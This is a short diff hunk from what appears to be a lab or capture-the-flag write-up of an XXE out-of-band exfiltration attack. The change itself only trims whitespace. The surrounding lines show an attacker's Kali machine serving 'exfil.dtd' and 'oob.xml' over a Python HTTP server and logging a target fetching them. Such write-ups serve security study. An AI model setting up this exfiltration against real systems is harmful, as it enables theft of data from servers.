@@ -129,7 +129,7 @@ kali@kali:cat exfil.dtd
 Now continue the same steps.
 
 ```bash
-kali@kali:python3 -m http.server 445                                                                                                                               
+kali@kali:python3 -m http.server 445
 Serving HTTP on 0.0.0.0 port 445 (http://0.0.0.0:445/) ...
 10.48.171.145 - - [12/Mar/2026 05:59:45] "GET /oob.xml HTTP/1.1" 200 -
 10.48.171.145 - - [12/Mar/2026 05:59:45] "GET /exfil.dtd HTTP/1.1" 200 -
